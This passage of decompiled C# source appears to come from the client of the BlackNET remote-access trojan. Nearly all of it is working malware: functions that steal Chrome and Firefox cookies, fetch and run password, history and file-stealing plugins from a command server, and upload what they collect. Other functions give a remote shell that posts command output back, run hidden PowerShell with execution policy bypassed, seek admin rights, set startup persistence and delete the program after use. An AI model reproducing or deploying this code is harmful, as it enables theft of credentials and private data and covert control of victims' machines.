          string[] filelist = new string[8];
          filelist[0] = "ProgramList.txt";
          string[] strArray3 = filelist;
          HTTP c = this.C;
          string str3 = this.ID + "_" + this.HWD();
          ref string local = ref str3;
          string str4 = c.ENB(ref local) + ".png";
          strArray3[1] = str4;
          filelist[2] = "CookiesCh.sqlite";
          filelist[3] = "cookies.sqlite";
          filelist[4] = "Passwords.txt";
          filelist[5] = "Token.txt";
          filelist[6] = "History.txt";
          filelist[7] = this.s + ".txt";
          this.TempCleaner(filelist);
          this.C.Send("CleanCommands");
        }
        else if (Operators.CompareString(Left1, "Restart", true) == 0)
        {
          this.C.Send("CleanCommands");
          Application.Restart();
        }
        else if (Operators.CompareString(Left1, "Elevate", true) == 0)
        {
          try
          {
            new Thread(new ThreadStart(this.RestartElevated))
            {
              IsBackground = true
            }.Start();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          this.C.Send("CleanCommands");
        }
        else if (Operators.CompareString(Left1, "Logoff", true) == 0)
        {
          try
          {
            this.C.Send("CleanCommands");
            Interaction.Shell("shutdown -l -t 00", AppWinStyle.Hide);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            this.C.Log("Fail", "An unexpected error occurred " + ex.Message);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left1, "Restart", true) == 0)
        {
          try
          {
            this.C.Send("CleanCommands");
            Interaction.Shell("shutdown -r -t 00", AppWinStyle.Hide);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        else
        {
          if (Operators.CompareString(Left1, "Shutdown", true) != 0)
            return;
          try
          {
            this.C.Send("CleanCommands");
            Interaction.Shell("shutdown -s -t 00", AppWinStyle.Hide);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public object Unsanitize(string value) => (object) value.Replace("&amp;", "&").Replace("&lt;", "<").Replace("&gt;", ">").Replace("&quot;", "\"").Replace("&apos;", "'");

    public object StealChromeCookies()
    {
      object obj;
      try
      {
        string path1 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), Path.Combine(Path.Combine(Path.Combine("Google", "Chrome"), "User Data"), "Default"));
        if (System.IO.File.Exists(Path.Combine(path1, "Cookies")))
        {
          System.IO.File.Copy(Path.Combine(path1, "Cookies"), Path.Combine(this.TempPath, "CookiesCh.sqlite"), true);
          this.C.Upload(Path.Combine(this.TempPath, "CookiesCh.sqlite"));
        }
        this.C.Log("Succ", "Chrome cookies has been uploaded");
        obj = (object) true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        this.C.Log("Fail", "An unexpected error occurred " + ex.Message);
        obj = (object) false;
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public object RemoteShell(string[] paramaters)
    {
      object obj;
      try
      {
        Process process = new Process();
        process.StartInfo = new ProcessStartInfo(paramaters[0], "/c " + paramaters[1])
        {
          UseShellExecute = false,
          CreateNoWindow = true,
          RedirectStandardOutput = true
        };
        process.Start();
        string end;
        using (StreamReader standardOutput = process.StandardOutput)
          end = standardOutput.ReadToEnd();
        this.C._POST("remoteshell.php", "clientid=" + this.C.ID + "&result=" + end);
        this.C.Log("Succ", "Shell Command has been executed");
        obj = (object) true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        this.C.Log("Fail", "An unexpected error occurred " + ex.Message);
        obj = (object) false;
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public object FileSearcher(object[] paramters)
    {
      object obj;
      try
      {
        try
        {
          WebClient webClient = new WebClient();
          if (!System.IO.File.Exists(Path.Combine(Application.StartupPath, "Ionic.Zip.dll")))
          {
            webClient.DownloadFile(this.C.Host + "/plugins/Ionic.Zip.dll", Path.Combine(Application.StartupPath, "Ionic.Zip.dll"));
            System.IO.File.SetAttributes(Path.Combine(Application.StartupPath, "Ionic.Zip.dll"), FileAttributes.Hidden);
          }
          byte[] PluginBytes = webClient.DownloadData(this.C.Host + "/plugins/FileSearcher.dll");
          HTTP c = this.C;
          string str1 = "RmlsZVNlYXJjaGVyLkZpbGVTZWFyY2hlcg";
          ref string local = ref str1;
          string typeName = c.DEB(ref local);
          object[] paramter = paramters;
          if (Operators.ConditionalCompareObjectEqual(this.LoadDLL(PluginBytes, typeName, true, paramter), (object) true, true))
          {
            string[] files = Directory.GetFiles(Path.GetTempPath());
            int index = 0;
            while (index < files.Length)
            {
              string str2 = files[index];
              if (Operators.CompareString(Path.GetFileNameWithoutExtension(str2), "Stolen_Files", true) == 0 && Conversions.ToBoolean(this.C.Upload(Path.Combine(this.TempPath, str2))))
                System.IO.File.Delete(Path.Combine(this.TempPath, str2));
              checked { ++index; }
            }
            this.C.Log("Succ", "File Has been uploaded");
          }
          obj = (object) true;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          Exception exception = ex;
          this.C.Log("Fail", "An unexpected error occurred " + exception.Message);
          obj = (object) exception.Message;
          ProjectData.ClearProjectError();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) false;
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public object StealFFCookies()
    {
      object obj;
      try
      {
        string str = Path.Combine(Interaction.Environ("Appdata"), Path.Combine(Path.Combine("Mozilla", "Firefox"), "Profiles"));
        string[] directories = Directory.GetDirectories(str);
        int index = 0;
        while (index < directories.Length)
        {
          string path2 = directories[index].Replace(str + "\\", string.Empty);
          if (System.IO.File.Exists(Path.Combine(Path.Combine(str, path2), "cookies.sqlite")) && new FileInfo(Path.Combine(Path.Combine(str, path2), "cookies.sqlite")).Length > 0L)
          {
            System.IO.File.Copy(Path.Combine(Path.Combine(str, path2), "cookies.sqlite"), Path.Combine(Path.GetTempPath(), "cookies.sqlite"), true);
            break;
          }
          checked { ++index; }
        }
        obj = (object) true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) false;
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public object PowerShell(string TempName)
    {
      object obj;
      try
      {
        ProcessStartInfo startInfo = new ProcessStartInfo();
        ProcessStartInfo processStartInfo = startInfo;
        processStartInfo.FileName = "powershell";
        processStartInfo.Arguments = "–ExecutionPolicy Bypass -WindowStyle Hidden -NoExit -File \"" + TempName + "\"";
        processStartInfo.CreateNoWindow = true;
        processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        Process.Start(startInfo);
        obj = (object) true;
      }
      catch (Win32Exception ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        this.C.Log("Fail", "An unexpected error occurred " + ex.Message);
        obj = (object) false;
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public object TempCleaner(string[] filelist)
    {
      object obj;
      try
      {
        string[] strArray = filelist;
        int index = 0;
        while (index < strArray.Length)
        {
          string path2 = strArray[index];
          if (System.IO.File.Exists(Path.Combine(this.TempPath, path2)))
            System.IO.File.Delete(Path.Combine(this.TempPath, path2));
          checked { ++index; }
        }
        obj = (object) true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) false;
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public object checkUSB() => System.IO.File.Exists(Path.Combine(this.TempPath, "BlackNET.dat")) & Application.ExecutablePath.EndsWith("windows_update.exe") ? (object) "yes" : (object) "no";

    public string GetLocation()
    {
      string location = Assembly.GetExecutingAssembly().Location;
      if (Operators.CompareString(location, "", true) == 0 || location == null)
        location = Assembly.GetEntryAssembly().Location;
      return location;
    }

    public void SelfDestroy()
    {
      try
      {
        ProcessStartInfo startInfo = new ProcessStartInfo();
        ProcessStartInfo processStartInfo = startInfo;
        processStartInfo.FileName = "cmd.exe";
        processStartInfo.Arguments = "/C ping 1.1.1.1 -n 1 -w 4000 > Nul & Del \"" + this.GetLocation() + "\"";
        processStartInfo.CreateNoWindow = true;
        processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        Process.Start(startInfo);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public object Uninstall(bool RunSelfDestroy, bool RestartMe)
    {
      object obj;
      try
      {
        string[] filelist = new string[8];
        filelist[0] = "ProgramList.txt";
        string[] strArray = filelist;
        HTTP c = this.C;
        string str1 = this.ID + "_" + this.HWD();
        ref string local = ref str1;
        string str2 = c.ENB(ref local) + ".png";
        strArray[1] = str2;
        filelist[2] = "CookiesCh.sqlite";
        filelist[3] = "cookies.sqlite";
        filelist[4] = "Passwords.txt";
        filelist[5] = "Token.txt";
        filelist[6] = "History.txt";
        filelist[7] = this.s + ".txt";
        this.TempCleaner(filelist);
        if (Operators.CompareString(this.Startup, "True", true) == 0)
          svchost.Persistence.Startup.DStartup(this.StartName);
        if (Operators.CompareString(this.WatcherStatus, "True", true) == 0)
        {
          this.Watchdog.KeepRunning = false;
          this.Watchdog.StopWatcher(true);
        }
        if (RunSelfDestroy)
          this.SelfDestroy();
        if (RestartMe)
          Application.Restart();
        else
          Application.Exit();
        obj = (object) true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) false;
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public string getMD5Hash(byte[] B)
    {
      B = new MD5CryptoServiceProvider().ComputeHash(B);
      string md5Hash = "";
      byte[] numArray = B;
      int index = 0;
      while (index < numArray.Length)
      {
        byte num = numArray[index];
        md5Hash += num.ToString("x2");
        checked { ++index; }
      }
      return md5Hash;
    }

    public void OpenWebHidden(string Url)
    {
      try
      {
        this.HiddenBrowser.ScriptErrorsSuppressed = true;
        this.HiddenBrowser.Navigate(Url);
        this.C.Log("Succ", "Webpage has been opened in hidden mode");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        this.C.Log("Fail", "An unexpected error occurred " + ex.Message);
        ProjectData.ClearProjectError();
      }
    }

    public string checkadmin() => new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) ? "Administrator" : "User";

    public object StealPasswords()
    {
      object obj;
      try
      {
        WebClient webClient = new WebClient();
        if (!System.IO.File.Exists(Path.Combine(Application.StartupPath, "Newtonsoft.Json.dll")))
        {
          webClient.DownloadFile(this.C.Host + "/plugins/Newtonsoft.Json.dll", Path.Combine(Application.StartupPath, "Newtonsoft.Json.dll"));
          System.IO.File.SetAttributes(Path.Combine(Application.StartupPath, "Newtonsoft.Json.dll"), FileAttributes.Hidden);
        }
        byte[] PluginBytes = webClient.DownloadData(this.C.Host + "/plugins/PasswordStealer.dll");
        HTTP c = this.C;
        string str = "UGFzc3dvcmRTdGVhbGVyLlN0ZWFsZXI";
        ref string local = ref str;
        string typeName = c.DEB(ref local);
        if (Operators.ConditionalCompareObjectEqual(this.LoadDLL(PluginBytes, typeName), (object) true, true))
          this.C.Upload(Path.Combine(this.TempPath, "Passwords.txt"));
        else
          this.C.Log("Fail", "Password Stelaer failed in collecting passwords");
        this.C.Log("Succ", "Password Stealer has been executed");
        obj = (object) true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        this.C.Log("Fail", "An unexpected error occurred " + exception.Message);
        obj = (object) exception.Message;
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public object StealHistory()
    {
      object obj;
      try
      {
        byte[] PluginBytes = new WebClient().DownloadData(this.C.Host + "/plugins/HistoryStealer.dll");
        HTTP c = this.C;
        string str = "SGlzdG9yeVN0ZWFsZXIuU3RlYWxlcg";
        ref string local = ref str;
        string typeName = c.DEB(ref local);
        if (Operators.ConditionalCompareObjectEqual(this.LoadDLL(PluginBytes, typeName), (object) true, true))
          this.C.Upload(Path.Combine(this.TempPath, "History.txt"));
        else
          this.C.Log("Fail", "History Stealer failed in collecting data");
        this.C.Log("Succ", "History Stealer has been executed");
        obj = (object) true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        this.C.Log("Fail", "An unexpected error occurred " + exception.Message);
        obj = (object) exception.Message;
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public object CustomPlugin(byte[] PluginBytes, string typeName, string hasOutput)
    {
      object obj;
      try
      {
        if (Operators.CompareString(hasOutput, "True", true) == 0)
        {
          if (System.IO.File.Exists(Path.Combine(this.TempPath, "PluginOutput.txt")))
            System.IO.File.Delete(Path.Combine(this.TempPath, "PluginOutput.txt"));
          System.IO.File.WriteAllText(Path.Combine(this.TempPath, "PluginOutput.txt"), Conversions.ToString(this.LoadDLL(PluginBytes, typeName)));
          this.C.Upload(Path.Combine(this.TempPath, "PluginOutput.txt"));
          obj = (object) true;
        }
        else
          obj = this.LoadDLL(PluginBytes, typeName);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) ex.Message;
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public object LoadDLL(
      byte[] PluginBytes,
      string typeName,
      bool hasParamters = false,
      object[] paramter = null)
    {
      object message;
      try
      {
        object objectValue = RuntimeHelpers.GetObjectValue(Assembly.Load(PluginBytes).CreateInstance(typeName));
        if (hasParamters)
          NewLateBinding.LateSet(objectValue, (System.Type) null, "paramters", new object[1]
          {
            (object) paramter
          }, (string[]) null, (System.Type[]) null);
        message = NewLateBinding.LateGet(objectValue, (System.Type) null, "Run", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        message = (object) ex.Message;
        ProjectData.ClearProjectError();
      }
      return message;
    }

    public string GetAntiVirus()
    {
      string antiVirus;
      try
      {
        string Left = (string) null;
        ManagementObjectCollection objectCollection = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "SELECT * FROM AntivirusProduct").Get();
        try
        {
          foreach (ManagementBaseObject managementBaseObject in objectCollection)
            Left = managementBaseObject["displayName"].ToString();
        }
        finally
        {
          ManagementObjectCollection.ManagementObjectEnumerator objectEnumerator;
          objectEnumerator?.Dispose();
        }
        if (Operators.CompareString(Left, string.Empty, true) == 0)
          Left = "N/A";
        Left.ToString();
        antiVirus = Left;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        antiVirus = "N/A";
        ProjectData.ClearProjectError();
      }
      return antiVirus;
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private void RestartElevated()
    {
      if (Operators.CompareString(this.checkadmin(), "Administrator", true) == 0)
        return;
      try
      {
        ProcessStartInfo startInfo = new ProcessStartInfo();
        ProcessStartInfo processStartInfo = startInfo;
        processStartInfo.UseShellExecute = true;
        processStartInfo.WorkingDirectory = Environment.CurrentDirectory;
        processStartInfo.FileName = Application.ExecutablePath;
        processStartInfo.Verb = "runas";
        this.C.Send("CleanCommands");
        this.C.Log("Succ", "Client has been elevated to admin");
        Process.Start(startInfo);
        ProjectData.EndApp();
      }
      catch (Win32Exception ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        this.C.Log("Fail", "An unexpected error occurred " + ex.Message);
        this.C.Send("CleanCommands");
        ProjectData.ClearProjectError();
      }
    }

    public object ProgramList()
    {
      object obj;
      try
      {
        TextBox textBox = new TextBox();
        string[] directories = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));
        int index = 0;
        while (index < directories.Length)
        {
          string str = directories[index];
          string text = str.Substring(str.LastIndexOf("\\")).Replace("\\", string.Empty) + "\r\n";
          textBox.AppendText(text);
          System.IO.File.WriteAllText(Path.Combine(this.TempPath, "ProgramList.txt"), textBox.Text);
          checked { ++index; }
        }
        obj = (object) true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) false;
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public string Randomisi(int lenght)
    {
      VBMath.Randomize();
      StringBuilder stringBuilder = new StringBuilder("");
      char[] charArray = "•¥µ☺☻♥♦♣♠•◘○◙♀♪♫☼►◄↕‼¶§▬↨↑↓→←∟↔▲▼1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzابتثجحخدذرزسشصضطظعغفقكلمنهوي~!@#$%^&*()+-/><".ToCharArray();
      int num1 = lenght;
      int num2 = 1;
      while (num2 <= num1)
      {
        VBMath.Randomize();
        int index = checked ((int) Math.Round((double) unchecked (Conversion.Int((float) checked (charArray.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f)));
        stringBuilder.Append(charArray[index]);
        checked { ++num2; }
      }
      return stringBuilder.ToString();
    }

    [DllImport("kernel32", EntryPoint = "GetVolumeInformationA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetVolumeInformation(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer,
      int nVolumeNameSize,
      ref int lpVolumeSerialNumber,
      ref int lpMaximumComponentLength,
      ref int lpFileSystemFlags,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer,
      int nFileSystemNameSize);

    public string HWD()
    {
      string str1;
      try
      {
        string str2 = Interaction.Environ("SystemDrive") + "\\";
        ref string local1 = ref str2;
        string str3 = (string) null;
        ref string local2 = ref str3;
        int Number;
        ref int local3 = ref Number;
        int num1 = 0;
        ref int local4 = ref num1;
        int num2 = 0;
        ref int local5 = ref num2;
        string str4 = (string) null;
        ref string local6 = ref str4;
        MainController.GetVolumeInformation(ref local1, ref local2, 0, ref local3, ref local4, ref local5, ref local6, 0);
        str1 = Conversion.Hex(Number);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str1 = "ERR";
        ProjectData.ClearProjectError();
      }
      return str1;
    }

    private bool CompDir(FileInfo F1, FileInfo F2)
    {
      if (Operators.CompareString(F1.Name.ToLower(), F2.Name.ToLower(), true) != 0)
        return false;
      DirectoryInfo directoryInfo1 = F1.Directory;
      DirectoryInfo directoryInfo2 = F2.Directory;
      while (Operators.CompareString(directoryInfo1.Name.ToLower(), directoryInfo2.Name.ToLower(), true) == 0)
      {
        directoryInfo1 = directoryInfo1.Parent;
        directoryInfo2 = directoryInfo2.Parent;
        if (directoryInfo1 == null & directoryInfo2 == null)
          return true;
        if (directoryInfo1 == null || directoryInfo2 == null)
          return false;
      }
      return false;
    }

    public void StartWork(bool x)
    {
      while (x)
        svchost.Persistence.Startup.AStartup(this.StartName, Application.ExecutablePath);
    }
  }
}
